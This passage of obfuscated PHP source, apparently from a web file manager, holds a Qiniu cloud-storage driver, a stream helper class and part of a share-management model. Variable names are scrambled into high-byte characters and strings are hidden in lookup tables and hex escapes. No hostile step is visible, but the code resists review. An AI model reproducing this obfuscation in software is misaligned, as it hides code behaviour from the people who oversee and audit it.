$Î»¤åÈ· =& $_SERVER[¦»×‡Ãã]; if (!$this->exist($™¸£¦¥µ)) { return !0; } $this->listItemCache = !1; $È¦Êæ€è = $this->fileList($™¸£¦¥µ); $this->listItemCache = !0; $¯ÎÑÖæå = trim($™¸£¦¥µ, $Î»¤åÈ·[8]) . $Î»¤åÈ·[8]; if (!empty($™¸£¦¥µ) && $™¸£¦¥µ !== $Î»¤åÈ·[228] && !in_array($¯ÎÑÖæå, $È¦Êæ€è[$Î»¤åÈ·[85]])) { $È¦Êæ€è[$Î»¤åÈ·[85]][] = $¯ÎÑÖæå; } $²‘ª½şô = $this->delByBatch($È¦Êæ€è[$Î»¤åÈ·[86]]); if (!$²‘ª½şô) { return !1; } $²‘ª½şô = $this->delByBatch($È¦Êæ€è[$Î»¤åÈ·[85]]); if (!$²‘ª½şô) { return !1; } return $this->delFile($¯ÎÑÖæå); } private function delByBatch($÷Ö¿Ì”ù) { foreach (array_chunk($÷Ö¿Ì”ù, 1000) as $”İ÷§‚Ç) { $¦…·Ã¿¸ = $this->bucketManager->buildBatchDelete($this->bucket, $”İ÷§‚Ç); list($‰­ı¨ô›, $¸ïÂè›ì) = $this->bucketManager->batch($¦…·Ã¿¸); if ($¸ïÂè›ì) { return !1; } } return !0; } public function rename($òëÕ­¾•, $½ö°ã…ò) { return $this->renameObject($òëÕ­¾•, $½ö°ã…ò); } public function fileInfo($ä‹ˆ€·­, $ÅÏŸ¼‰‘ = false, $éÏ¡„Ñ… = array()) { $Âï¿Õö‰ =& $_SERVER[¦»×‡Ãã]; $‚¼ç¦ÜÒ = array($Âï¿Õö‰[32] => $this->pathThis($ä‹ˆ€·­), $Âï¿Õö‰[87] => $this->getPathOuter($Âï¿Õö‰[8] . $ä‹ˆ€·­), $Âï¿Õö‰[33] => $Âï¿Õö‰[230], $Âï¿Õö‰[79] => isset($éÏ¡„Ñ…[$Âï¿Õö‰[1530]]) ? $éÏ¡„Ñ…[$Âï¿Õö‰[1530]] : 0, $Âï¿Õö‰[169] => $this->ext($ä‹ˆ€·­)); if ($ÅÏŸ¼‰‘) { return $‚¼ç¦ÜÒ; } $‚¼ç¦ÜÒ[$Âï¿Õö‰[231]] = $‚¼ç¦ÜÒ[$Âï¿Õö‰[88]] = 0; $‚¼ç¦ÜÒ[$Âï¿Õö‰[232]] = $‚¼ç¦ÜÒ[$Âï¿Õö‰[233]] = !0; if (empty($éÏ¡„Ñ…)) { $éÏ¡„Ñ… = $this->objectMeta($ä‹ˆ€·­); if (!$éÏ¡„Ñ…) { return $‚¼ç¦ÜÒ; } } if (isset($éÏ¡„Ñ…[$Âï¿Õö‰[234]]) && $éÏ¡„Ñ…[$Âï¿Õö‰[234]]) { $‚¼ç¦ÜÒ[$Âï¿Õö‰[235]] = $éÏ¡„Ñ…[$Âï¿Õö‰[234]]; } if (isset($éÏ¡„Ñ…[$Âï¿Õö‰[245]]) && $éÏ¡„Ñ…[$Âï¿Õö‰[245]]) { $‚¼ç¦ÜÒ[$Âï¿Õö‰[235]] = $éÏ¡„Ñ…[$Âï¿Õö‰[245]]; } if (isset($éÏ¡„Ñ…[$Âï¿Õö‰[1531]])) { $‚¼ç¦ÜÒ[$Âï¿Õö‰[88]] = substr($éÏ¡„Ñ…[$Âï¿Õö‰[1531]] . $Âï¿Õö‰[12], 0, 10); } if (isset($éÏ¡„Ñ…[$Âï¿Õö‰[1530]])) { $‚¼ç¦ÜÒ[$Âï¿Õö‰[79]] = $éÏ¡„Ñ…[$Âï¿Õö‰[1530]]; } return $‚¼ç¦ÜÒ; } public function folderInfo($¾›Ûá›¿, $Ü“è­–¸ = false) { $ÅÅâôÁÓ =& $_SERVER[¦»×‡Ãã]; $’÷Ô‚ş = array($ÅÅâôÁÓ[32] => $this->pathThis($¾›Ûá›¿), $ÅÅâôÁÓ[87] => $this->getPathOuter($ÅÅâôÁÓ[8] . $¾›Ûá›¿), $ÅÅâôÁÓ[33] => $ÅÅâôÁÓ[78]); if ($Ü“è­–¸) { return $’÷Ô‚ş; } $’÷Ô‚ş[$ÅÅâôÁÓ[231]] = $’÷Ô‚ş[$ÅÅâôÁÓ[88]] = 0; $’÷Ô‚ş[$ÅÅâôÁÓ[232]] = $’÷Ô‚ş[$ÅÅâôÁÓ[233]] = !0; $¾›Ûá›¿ = rtrim($¾›Ûá›¿, $ÅÅâôÁÓ[8]) . $ÅÅâôÁÓ[8]; $­ä€ßÆ = $this->objectMeta($¾›Ûá›¿); if (isset($­ä€ßÆ[$ÅÅâôÁÓ[1531]])) { $’÷Ô‚ş[$ÅÅâôÁÓ[88]] = substr($­ä€ßÆ[$ÅÅâôÁÓ[1531]] . $ÅÅâôÁÓ[12], 0, 10); } return $’÷Ô‚ş; } public function listPath($˜´æ”è, $ßÍÂ™ïü = false) { $‚¬æ§˜… =& $_SERVER[¦»×‡Ãã]; $ÍÇ±±’ = $this->fileList($˜´æ”è, $‚¬æ§˜…[8], !0); foreach ($ÍÇ±±’[$‚¬æ§˜…[85]] as $©›¤Şë => $Ğ¤†ØÙŞ) { $ÍÇ±±’[$‚¬æ§˜…[85]][$©›¤Şë] = $this->folderInfo($Ğ¤†ØÙŞ, $ßÍÂ™ïü); } foreach ($ÍÇ±±’[$‚¬æ§˜…[86]] as $©›¤Şë => $Ğ¤†ØÙŞ) { $ÍÇ±±’[$‚¬æ§˜…[86]][$©›¤Şë] = $this->fileInfo($Ğ¤†ØÙŞ[$‚¬æ§˜…[97]], $ßÍÂ™ïü, $Ğ¤†ØÙŞ); } return $ÍÇ±±’; } public function has($Êæò¸÷ë, $š¢”ƒÕ¾ = false, $òßóÀÈ = true) { $ËëåØ÷ =& $_SERVER[¦»×‡Ãã]; $Êæò¸÷ë = trim($Êæò¸÷ë, $ËëåØ÷[8]); $×î€±Ñ§ = empty($Êæò¸÷ë) && $Êæò¸÷ë !== $ËëåØ÷[228] ? $ËëåØ÷[12] : $Êæò¸÷ë . $ËëåØ÷[8]; $¸Ûì‡É˜ = $ËëåØ÷[12]; $³İİÛü¥ = 500; $ûÆàòåÍ = $ËëåØ÷[8]; $÷Êè­»» = $³šŠãºä = 0; while (!0) { check_abort(); list($³Ã¦ò‡, $ú©èûõò) = $this->bucketManager->listFiles($this->bucket, $×î€±Ñ§, $¸Ûì‡É˜, $³İİÛü¥, $ûÆàòåÍ); if ($ú©èûõò) { break; } $¸Ûì‡É˜ = array_key_exists($ËëåØ÷[1476], $³Ã¦ò‡) ? $¸Ûì‡É˜ = $³Ã¦ò‡[$ËëåØ÷[1532]] : $ËëåØ÷[12]; if ($š¢”ƒÕ¾) { if (!empty($³Ã¦ò‡[$ËëåØ÷[1533]])) { $÷Êè­»» += count($³Ã¦ò‡[$ËëåØ÷[1533]]); } if (!empty($³Ã¦ò‡[$ËëåØ÷[1534]])) { $³šŠãºä += count($³Ã¦ò‡[$ËëåØ÷[1534]]); } if ($¸Ûì‡É˜ === $ËëåØ÷[12]) { break; } continue; } if ($òßóÀÈ) { if (!empty($³Ã¦ò‡[$ËëåØ÷[1533]])) { return !0; } } else { if (!empty($³Ã¦ò‡[$ËëåØ÷[1534]])) { return !0; } } if ($¸Ûì‡É˜ === $ËëåØ÷[12]) { break; } } if ($š¢”ƒÕ¾) { return array($ËëåØ÷[239] => $÷Êè­»», $ËëåØ÷[240] => $³šŠãºä); } return !1; } public function listAll($ÙÉçÀ) { $Ç×´Êâõ =& $_SERVER[¦»×‡Ãã]; $ã–öíÔ“ = $this->fileList($ÙÉçÀ, $Ç×´Êâõ[12], !0); $öµÙºƒš = array_to_keyvalue($ã–öíÔ“[$Ç×´Êâõ[86]], $Ç×´Êâõ[32]); foreach ($ã–öíÔ“[$Ç×´Êâõ[85]] as $¶¶™Œ¥¿) { if (is_string($¶¶™Œ¥¿)) { $öµÙºƒš[$¶¶™Œ¥¿] = array($Ç×´Êâõ[79] => 0); } } return $this->listAllFiles($ÙÉçÀ, $öµÙºƒš); } private function fileList($ïşÃİô, $¯î°–ØÇ = '', $ÖÖæã„  = 0) { $’²™Á½ë =& $_SERVER[¦»×‡Ãã]; $ïşÃİô = trim($ïşÃİô, $’²™Á½ë[8]); $¼¯ƒöòç = empty($ïşÃİô) && $ïşÃİô !== $’²™Á½ë[228] ? $’²™Á½ë[12] : $ïşÃİô . $’²™Á½ë[8]; $—‹¯×Ÿ = $’²™Á½ë[12]; $«¥£õèÇ = 1000; $ôšë€› = $±‰ûÓ§ = array(); while (!0) { check_abort(); list($…èÁ¥êÒ, $êÈğÙ”ú) = $this->bucketManager->listFiles($this->bucket, $¼¯ƒöòç, $—‹¯×Ÿ, $«¥£õèÇ, $¯î°–ØÇ); if ($êÈğÙ”ú) { break; } $—‹¯×Ÿ = array_key_exists($’²™Á½ë[1476], $…èÁ¥êÒ) ? $—‹¯×Ÿ = $…èÁ¥êÒ[$’²™Á½ë[1532]] : $’²™Á½ë[12]; $Û›àô×® = isset($…èÁ¥êÒ[$’²™Á½ë[1533]]) ? $…èÁ¥êÒ[$’²™Á½ë[1533]] : array(); $òË›³™ = isset($…èÁ¥êÒ[$’²™Á½ë[1534]]) ? $…èÁ¥êÒ[$’²™Á½ë[1534]] : array(); foreach ($Û›àô×® as $ÙÏ­¨ş) { if ($ÙÏ­¨ş[$’²™Á½ë[97]] == $¼¯ƒöòç) { continue; } $’„ˆé¦ù = $ÙÏ­¨ş[$’²™Á½ë[97]]; $Ö«¥Ââæ = $ÙÏ­¨ş[$’²™Á½ë[1530]]; $ÙÏ­¨ş[$’²™Á½ë[79]] = $Ö«¥Ââæ; $µ€ïíìÚ = $Ö«¥Ââæ == 0 && substr($’„ˆé¦ù, strlen($’„ˆé¦ù) - 1, 1) == $’²™Á½ë[8] ? !0 : !1; $this->cacheMethodInfoSet($’„ˆé¦ù, $µ€ïíìÚ, $ÙÏ­¨ş); if ($µ€ïíìÚ) { $ôšë€›[] = $’„ˆé¦ù; continue; } $±‰ûÓ§[] = $ÖÖæã„  ? $ÙÏ­¨ş : $’„ˆé¦ù; } foreach ($òË›³™ as $’„ˆé¦ù) { if ($’„ˆé¦ù == $¼¯ƒöòç) { continue; } $ôšë€›[] = $’„ˆé¦ù; $this->cacheMethodInfoSet($’„ˆé¦ù, !0); } if ($—‹¯×Ÿ === $’²™Á½ë[12]) { break; } } $this->cacheMethodInfoSet($ïşÃİô, !0); return array($’²™Á½ë[85] => $ôšë€›, $’²™Á½ë[86] => $±‰ûÓ§); } public function canRead($«÷ÄÌŒÎ) { return $this->exist($«÷ÄÌŒÎ) ? !0 : !1; } public function canWrite($Ä› «ÒÅ) { return $this->exist($Ä› «ÒÅ) ? !0 : !1; } public function getContent($¼ºóÉÃ“) { return $this->fileSubstr($¼ºóÉÃ“, 0, -1); } public function setContent($æÖß üÓ, $ñ©†ÍÇ÷ = '') { $¡¾ü§Ñ¦ = $this->tempFile($this->pathThis($æÖß üÓ)); file_put_contents($¡¾ü§Ñ¦, $ñ©†ÍÇ÷); if ($this->upload($æÖß üÓ, $¡¾ü§Ñ¦)) { $this->tempFileRemve($¡¾ü§Ñ¦); return !0; } return !1; } public function refreshUrls($Óïë…¹˜) { $œï»‹ãÊ =& $_SERVER[¦»×‡Ãã]; $ÄœºÊ¶ = array(); if (is_array($Óïë…¹˜)) { foreach ($Óïë…¹˜ as $úº¶Ô¹ä) { $ÄœºÊ¶[] = $this->link($úº¶Ô¹ä); } } else { $ÄœºÊ¶[] = $this->link($Óïë…¹˜); } $÷Ì¯“ Ö = new Qiniu\Cdn\CdnManager($this->auth); list($É¹£›Öœ, $øÑ•ğü‘) = $÷Ì¯“ Ö->refreshUrls($ÄœºÊ¶); if ($øÑ•ğü‘) { return !1; } return $É¹£›Öœ[$œï»‹ãÊ[1264]] == $œï»‹ãÊ[832] ? !0 : !1; } public function fileSubstr($”°ìºÖ˜, $Íƒ­Ñ±Ö, $×Ò¸è¢à) { $Åš€ÜşŸ =& $_SERVER[¦»×‡Ãã]; if (!($æá «– = $this->link($”°ìºÖ˜))) { return !1; } $Î‡Ø€Ÿ› = !1; if ($×Ò¸è¢à > 0) { $Éà³Î¬ = $Íƒ­Ñ±Ö + $×Ò¸è¢à - 1; $Î‡Ø€Ÿ› = array($Åš€ÜşŸ[1535] . $Íƒ­Ñ±Ö . $Åš€ÜşŸ[462] . $Éà³Î¬); } $½ à´ = url_request($æá «–, $Åš€ÜşŸ[261], !1, $Î‡Ø€Ÿ›); return $½ à´[$Åš€ÜşŸ[823]] ? $½ à´[$Åš€ÜşŸ[1287]] : !1; } public function upload($•¦‡ùÕñ, $óÙ×”’Å, $î¿¢¨ï = false, $ë¾—ÎòÎ = REPEAT_REPLACE) { $°Õ—‹Ã = new Qiniu\Storage\UploadManager(); $ğÛñ÷ë = $this->auth->uploadToken($this->bucket, $•¦‡ùÕñ); $úŒå¼Ôı = get_file_mime(get_path_ext($óÙ×”’Å)); list($ê¸‹’¾ƒ, $˜•Á¨éã) = $°Õ—‹Ã->putFile($ğÛñ÷ë, $•¦‡ùÕñ, $óÙ×”’Å, null, $úŒå¼Ôı); return $˜•Á¨éã ? !1 : $this->getPathOuter($•¦‡ùÕñ); } public function uploadFormData($ó„¨‰ñô, $«ÕªÖÓ = 3600) { return $this->uploadToken($ó„¨‰ñô, $«ÕªÖÓ); } public function multiUploadFormData($Äà’Ëˆ, $”ÎÍÌæĞ = 3600) { return $this->uploadToken($Äà’Ëˆ, $”ÎÍÌæĞ); } private function uploadToken($€é„ş£, $™ö©Ì¾ò = 3600) { $´ê“­’ì =& $_SERVER[¦»×‡Ãã]; $·×ïˆ¿¾ = $™ö©Ì¾ò; $ªŠı‡½ = array($´ê“­’ì[1536] => $´ê“­’ì[1537]); $ßá—‹ = $€é„ş£; $ëú„Öˆñ = $this->auth->uploadToken($this->bucket, $ßá—‹, $·×ïˆ¿¾, $ªŠı‡½, !0); $¡Àßç› = empty($this->region) || $this->region == $´ê“­’ì[1538] ? $´ê“­’ì[12] : $´ê“­’ì[462] . $this->region; $ñÙÑ†á§ = http_type() . "\x3a\x2f\57\x75\160\154\157\141\144{$¡Àßç›}\x2e\161\151\156\151\x75\160\x2e\143\x6f\x6d\x2f"; return array($´ê“­’ì[1539] => $ëú„Öˆñ, $´ê“­’ì[1540] => $ñÙÑ†á§); } public function download($õºã®Ö, $°ÏúÉ®„) { $Óí‘Êˆ” = IO::getPathInner(IO::mkfile($°ÏúÉ®„)); if (!($ìñ¯¹üŸ = $this->link($õºã®Ö))) { return !1; } $Ğ½²¢Œâ = 0; $¦€û­ş = 1024 * 200; $Ô©»‹‡ó = fopen($Óí‘Êˆ”, $_SERVER[¦»×‡Ãã][1541]); while (!0) { $é©•ßğ = $this->fileSubstr($õºã®Ö, $Ğ½²¢Œâ, $¦€û­ş); if ($é©•ßğ === !1) { return !1; } fwrite($Ô©»‹‡ó, $é©•ßğ); $Ğ½²¢Œâ += $¦€û­ş; if (strlen($é©•ßğ) < $¦€û­ş) { break; } } fclose($Ô©»‹‡ó); return $°ÏúÉ®„; } public function link($ë¯¯ùÔó, $ƒÀòÂ‹ô = '') { if (!$this->isFile($ë¯¯ùÔó)) { return !1; } $É›«×”½ = $this->getHost() . $_SERVER[¦»×‡Ãã][8] . $this->pathEncode($ë¯¯ùÔó) . $ƒÀòÂ‹ô; return $this->auth->privateDownloadUrl($É›«×”½, 3600 * 12); } public function fileOut($°¨˜İõø, $†Ğº¶ªÁ = false, $Š±ñ”œ = false, $Ë˜¹‡¨¡ = '') { $¯×™³öù =& $_SERVER[¦»×‡Ãã]; if ($this->isFileOutServer()) { return $this->fileOutServer($°¨˜İõø, $†Ğº¶ªÁ, $Š±ñ”œ, $Ë˜¹‡¨¡); } if (!$Š±ñ”œ) { $Š±ñ”œ = $this->pathThis($°¨˜İõø); } $…û¾¦ª· = $†Ğº¶ªÁ ? $¯×™³öù[1542] . rawurlencode($Š±ñ”œ) : $¯×™³öù[12]; $òà‹¡é = $this->link($°¨˜İõø, $…û¾¦ª·); $this->fileOutLink($òà‹¡é); } public function fileOutServer($Ş®×º¯ª, $€øæ¤ßÚ = false, $ãƒ¾Îµ = false, $ëšó¦ñ = '') { parent::fileOut($Ş®×º¯ª, $€øæ¤ßÚ, $ãƒ¾Îµ, $ëšó¦ñ); } public function fileOutImage($‹ˆ·ñ›, $óø¿…èë = 250) { if ($this->size($‹ˆ·ñ›) > 1024 * 1024 * 20) { return $this->fileOutImageServer($‹ˆ·ñ›, $óø¿…èë); } $Ê±„‘¹¡ = $this->link($‹ˆ·ñ›, $_SERVER[¦»×‡Ãã][1543] . $óø¿…èë); $this->fileOutLink($Ê±„‘¹¡); } public function fileOutImageServer($¤»å©Ş², $³¸«®É± = 250) { parent::fileOutImage($¤»å©Ş², $³¸«®É±); } public function hashMd5($²¤£àÎâ) { $Ÿ¤Ü¡ıÒ =& $_SERVER[¦»×‡Ãã]; $ÉŠëÆ¸­ = $this->objectMeta($²¤£àÎâ); return isset($ÉŠëÆ¸­[$Ÿ¤Ü¡ıÒ[245]]) ? $ÉŠëÆ¸­[$Ÿ¤Ü¡ıÒ[245]] : !1; $…¼¢ú¼ = $this->link($²¤£àÎâ, $Ÿ¤Ü¡ıÒ[1544]); } public function size($òáÙ•Ü®) { $Œª¾éâ· = $this->objectMeta($òáÙ•Ü®); return $Œª¾éâ· ? $Œª¾éâ·[$_SERVER[¦»×‡Ãã][79]] : 0; } public function info($”ĞçÌ½Í) { if ($this->isFolder($”ĞçÌ½Í)) { return $this->folderInfo($”ĞçÌ½Í); } else { if ($this->isFile($”ĞçÌ½Í)) { return $this->fileInfo($”ĞçÌ½Í); } } return !1; } public function exist($İ‡öîşİ) { return $this->isFile($İ‡öîşİ) || $this->isFolder($İ‡öîşİ); } public function isFile($½€î¤æË) { return !$this->isFolder($½€î¤æË) && $this->objectMeta($½€î¤æË); } public function isFolder($íŸîóŞ§) { return $this->cacheMethod($_SERVER[¦»×‡Ãã][179], $íŸîóŞ§); } protected function objectMeta($­à—¿“Ó) { return $this->cacheMethod($_SERVER[¦»×‡Ãã][181], $­à—¿“Ó); } protected function _objectMeta($§ã»´½Ÿ) { $òñèÌßì =& $_SERVER[¦»×‡Ãã]; list($¼×ãÕÆĞ, $¡œ‰®õ) = $this->bucketManager->stat($this->bucket, $§ã»´½Ÿ); if ($¼×ãÕÆĞ) { $¼×ãÕÆĞ[$òñèÌßì[79]] = intval($¼×ãÕÆĞ[$òñèÌßì[1530]]); } return $¼×ãÕÆĞ; } protected function _isFolder($Ï›ñ“ô) { $¶ĞÄ£‘º =& $_SERVER[¦»×‡Ãã]; if ($Ï›ñ“ô == $¶ĞÄ£‘º[12] || $Ï›ñ“ô == $¶ĞÄ£‘º[8]) { return !0; } list($ñÎä¨ú§, $ïŞİë™) = $this->bucketManager->listFiles($this->bucket, trim($Ï›ñ“ô, $¶ĞÄ£‘º[8]) . $¶ĞÄ£‘º[8], $¶ĞÄ£‘º[12], 1, $¶ĞÄ£‘º[8]); return !empty($ñÎä¨ú§[$¶ĞÄ£‘º[1533]]) || !empty($ñÎä¨ú§[$¶ĞÄ£‘º[1534]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ªì¾Ş, $ı©× = 0) { parent::__construct(); $this->source = $ªì¾Ş; $this->sourceSize = $ı©×; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($€¼¢÷Àà = false) { return $this->sourceSize; } public function getContent($Ûø¸éî£ = false) { return $this->fileSubstr($Ûø¸éî£, 0, $this->sourceSize); } public function fileSubstr($×›ì£ê¶ = false, $áÑ€ñ  = 0, $Í²Î§ã  = 0) { if (!$Í²Î§ã ) { $Í²Î§ã  = $this->sourceSize; } $Ò¬¡ƒ†Ò = $this->sourceSize - $áÑ€ñ ; if ($Í²Î§ã  >= $Ò¬¡ƒ†Ò) { $Í²Î§ã  = $Ò¬¡ƒ†Ò; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $áÑ€ñ , $Í²Î§ã ); } if ($this->sourceType == self::TYPE_FILE) { if ($Í²Î§ã  <= 0) { return $_SERVER[¦»×‡Ãã][12]; } $Ñ©ÙŠ–Ñ = ftell($this->source); fseek_64($this->source, $Ñ©ÙŠ–Ñ + $áÑ€ñ ); $„±£²Å = @fread($this->source, $Í²Î§ã ); fseek_64($this->source, $Ñ©ÙŠ–Ñ); return $„±£²Å; } } public function hashMd5($¾»¯³»º = false) { return md5($this->getContent()); } public static function hash($í±‚ğª¥, $÷ç¾‚Ş = 0) { $¾¹‹“—ò = new PathDriverStream($í±‚ğª¥, $÷ç¾‚Ş); return $¾¹‹“—ò->hashSimple($í±‚ğª¥); } public static function md5($¨…ÄÅÓ«, $¤ÄÒÀ = 0) { $²”ñÎî¥ = new PathDriverStream($¨…ÄÅÓ«, $¤ÄÒÀ); return $²”ñÎî¥->hashMd5($¨…ÄÅÓ«); } } goto BÆÃ±âÅÂš; AÕÑô‘Ò…Š: class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\145"; protected $dataAuto = array(array("\155\157\144\x69\x66\171\124\x69\x6d\145", "\164\151\155\145", "\151\x6e\x73\x65\162\x74\x2c\165\160\144\x61\x74\x65", "\146\x75\x6e\143\164\x69\157\156"), array("\x63\x72\x65\x61\164\145\124\x69\155\x65", "\x74\151\x6d\145", "\x69\x6e\163\145\162\x74", "\x66\165\156\x63\x74\151\157\156"), array("\157\x70\x74\151\x6f\156\x73", '', "\x69\156\x73\145\x72\164\54\165\x70\144\141\164\x65\54\163\145\x6c\x65\143\164", "\x6a\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($¿Àº‹›Ë) { $·×´×Í‡ =& $_SERVER[¦»×‡Ãã]; $¬ŞŸ¼´û = isset($¿Àº‹›Ë[0]) ? $¿Àº‹›Ë[0] : !1; return array($·×´×Í‡[2114] => array(USER_ID, $·×´×Í‡[2115]), $·×´×Í‡[2055] => array($¬ŞŸ¼´û, $·×´×Í‡[2116])); } protected function listSimple() { $§¢ˆïÙÊ = array($_SERVER[¦»×‡Ãã][1772] => USER_ID); $º•“ = $this->field($this->fieldList)->where($§¢ˆïÙÊ)->select(); return $º•“ ? $º•“ : array(); } protected function getInfo($ŸèêşÉŒ, $ğ«À¼ƒ¶ = false) { $˜œÖİ±ƒ =& $_SERVER[¦»×‡Ãã]; if ($ğ«À¼ƒ¶) { return $this->_getShareInfo(array($˜œÖİ±ƒ[665] => $ŸèêşÉŒ)); } $“Ó¯ª¡Ô = $this->cacheFunctionGet($˜œÖİ±ƒ[2057], $ŸèêşÉŒ); return $“Ó¯ª¡Ô; } public function getInfoByHash($Ä°Íœùù) { return $this->_getShareInfo(array($_SERVER[¦»×‡Ãã][2117] => $Ä°Íœùù)); } public function getInfoByPath($ øŞøÆ‘) { $Û­½æ®„ =& $_SERVER[¦»×‡Ãã]; $İª¯×’Ö = array($Û­½æ®„[1772] => USER_ID, $Û­½æ®„[193] => $ øŞøÆ‘); return $this->_getShareInfo($İª¯×’Ö); } public function getInfoBySourcePath($ÖÕğĞ) { $½™€şÙæ =& $_SERVER[¦»×‡Ãã]; $ÔÕ§ÓŞ¤ = array($½™€şÙæ[1772] => USER_ID, $½™€şÙæ[1257] => $ÖÕğĞ); return $this->_getShareInfo($ÔÕ§ÓŞ¤); } private function _getShareInfo($Ö‹‘æ…Ô) { $êñü†„– =& $_SERVER[¦»×‡Ãã]; $ ›ş = $this->where($Ö‹‘æ…Ô)->find(); if (!$ ›ş) { return !1; } $Ö‹‘æ…Ô = array($êñü†„–[665] => $ ›ş[$êñü†„–[665]]); $÷şõ‘›ï = $êñü†„–[2118]; $‡áÔÙ¦ = Model($êñü†„–[666])->order($êñü†„–[475])->field($÷şõ‘›ï)->where($Ö‹‘æ…Ô)->select(); if ($ ›ş[$êñü†„–[193]] == $êñü†„–[228]) { $ ›ş[$êñü†„–[90]] = IO::info($ ›ş[$êñü†„–[1257]]); } else { $ ›ş[$êñü†„–[90]] = Model($êñü†„–[1420])->pathInfo($ ›ş[$êñü†„–[193]]); } $ ›ş[$êñü†„–[2119]] = $‡áÔÙ¦; return $ ›ş; } protected function getInfoAuth($Â¸‚”Ûü) { $´º‡ŠÛó =& $_SERVER[¦»×‡Ãã]; $ƒÓí†’ä = $this->getInfo($Â¸‚”Ûü); if ($ƒÓí†’ä[$´º‡ŠÛó[1772]] == USER_ID) { $ƒÓí†’ä[$´º‡ŠÛó[487]] = $ƒÓí†’ä[$´º‡ŠÛó[90]][$´º‡ŠÛó[487]]; } else { $ƒÓí†’ä[$´º‡ŠÛó[487]] = Model($´º‡ŠÛó[567])->authMake($ƒÓí†’ä[$´º‡ŠÛó[2119]]); } return $ƒÓí†’ä; } protected function listData($ÒÖšÜà = null, $‘Õ®Š€Ï = 300) { $Ì¸Ç±ãæ =& $_SERVER[¦»×‡Ãã]; $¸·ø‹²œ = array(array($Ì¸Ç±ãæ[562] => array($Ì¸Ç±ãæ[1090], 0), $Ì¸Ç±ãæ[663] => array($Ì¸Ç±ãæ[1090], 0), $Ì¸Ç±ãæ[2120] => $Ì¸Ç±ãæ[2073])); if ($ÒÖšÜà == $Ì¸Ç±ãæ[2121]) { $¸·ø‹²œ = array($Ì¸Ç±ãæ[562] => 1); } else { if ($ÒÖšÜà == $Ì¸Ç±ãæ[1242]) { $¸·ø‹²œ = array($Ì¸Ç±ãæ[663] => 1); } } $¸·ø‹²œ[$Ì¸Ç±ãæ[1772]] = USER_ID; $èæËõÈ‘ = $this->where($¸·ø‹²œ)->selectPage($‘Õ®Š€Ï); return $èæËõÈ‘; } protected function listToMe($Àªµ·à– = 300) { $Œ‰èöÕ¢ =& $_SERVER[¦»×‡Ãã]; $í×§ïî« = Model($Œ‰èöÕ¢[2122])->userGroupParents(USER_ID); $¿ù§Î‘¸ = array($Œ‰èöÕ¢[648] => SourceModel::TYPE_USER, $Œ‰èöÕ¢[569] => USER_ID); if ($í×§ïî«) { $¿ù§Î‘¸ = array(array($Œ‰èöÕ¢[648] => SourceModel::TYPE_USER, $Œ‰èöÕ¢[569] => USER_ID), array($Œ‰èöÕ¢[648] => SourceModel::TYPE_GROUP, $Œ‰èöÕ¢[569] => array($Œ‰èöÕ¢[7], $í×§ïî«)), $Œ‰èöÕ¢[2120] => $Œ‰èöÕ¢[2073]); } $¸®Œ–³ı = Model($Œ‰èöÕ¢[666])->where($¿ù§Î‘¸)->selectPage($Àªµ·à–); $äËĞÍÑ¼ = array_to_keyvalue_group($¸®Œ–³ı[$Œ‰èöÕ¢[445]], $Œ‰èöÕ¢[665]); if (!$äËĞÍÑ¼) { return $¸®Œ–³ı; } $è–ˆ„”¥ = $Œ‰èöÕ¢[2123]; $¿ù§Î‘¸ = array($Œ‰èöÕ¢[665] => array($Œ‰èöÕ¢[492], array_keys($äËĞÍÑ¼)), $Œ‰èöÕ¢[1772] => array($Œ‰èöÕ¢[1092], $Œ‰èöÕ¢[228])); $ù¯€ÁĞ = $this->field($è–ˆ„”¥)->where($¿ù§Î‘¸)->select(); foreach ($ù¯€ÁĞ as $«¾Ã”¸ => &$ìà³‰ç·) { $ìà³‰ç·[$Œ‰èöÕ¢[2119]] = $äËĞÍÑ¼[$ìà³‰ç·[$Œ‰èöÕ¢[665]]]; } unset($ìà³‰ç·); $úöÀŠ†û = array($Œ‰èöÕ¢[2124] => $ù¯€ÁĞ, $Œ‰èöÕ¢[2125] => $¸®Œ–³ı[$Œ‰èöÕ¢[442]]); return $úöÀŠ†û; } protected function shareAdd($ŞË£Ã¢Á, $Îãš´úæ) { $—ƒ‚Åµ =& $_SERVER[¦»×‡Ãã]; $É³Ôª = $this->_addShareData($ŞË£Ã¢Á, $Îãš´úæ); if (!empty($Îãš´úæ[$—ƒ‚Åµ[2126]])) { $this->_shareAuthSet($É³Ôª, $Îãš´úæ[$—ƒ‚Åµ[2126]]); } $this->shareEventAdd($ŞË£Ã¢Á, $Îãš´úæ, $—ƒ‚Åµ[2127]); return $É³Ôª; } protected function shareAddSystem($ñÊ³ó•È, $Â™çã¡) { $ÃŠãÛ‘ =& $_SERVER[¦»×‡Ãã]; $§¹¯€¹³ = $this->_addShareData($ñÊ³ó•È, $Â™çã¡, $ÃŠãÛ‘[191]); $this->_shareAuthSet($§¹¯€¹³, $Â™çã¡[$ÃŠãÛ‘[2126]]); return $§¹¯€¹³; } private function shareEventAdd($·õæ Á’, $É«Œ“•, $Åúööì = "\x61\x64\144") { $ˆÔ×¼Œú =& $_SERVER[¦»×‡Ãã]; if (!$·õæ Á’ || $·õæ Á’ == $ˆÔ×¼Œú[228]) { return; } if ($Åúööì == $ˆÔ×¼Œú[2127]) { if ($É«Œ“•[$ˆÔ×¼Œú[562]] == $ˆÔ×¼Œú[91]) { Model($ˆÔ×¼Œú[633])->eventShare($·õæ Á’, $ˆÔ×¼Œú[2128]); } if ($É«Œ“•[$ˆÔ×¼Œú[663]] == $ˆÔ×¼Œú[91]) { Model($ˆÔ×¼Œú[633])->eventShare($·õæ Á’, $ˆÔ×¼Œú[2129]); } return; } $ä„âşûÒ = $this->getInfoByPath($·õæ Á’); $ÂŞƒÈœû = $ˆÔ×¼Œú[2130]; if ($ä„âşûÒ[$ˆÔ×¼Œú[562]] == $ˆÔ×¼Œú[228] && $É«Œ“•[$ˆÔ×¼Œú[562]] == $ˆÔ×¼Œú[91]) { $ÂŞƒÈœû = $ˆÔ×¼Œú[2128]; } if ($ä„âşûÒ[$ˆÔ×¼Œú[562]] == $ˆÔ×¼Œú[91] && $É«Œ“•[$ˆÔ×¼Œú[562]] == $ˆÔ×¼Œú[228]) { 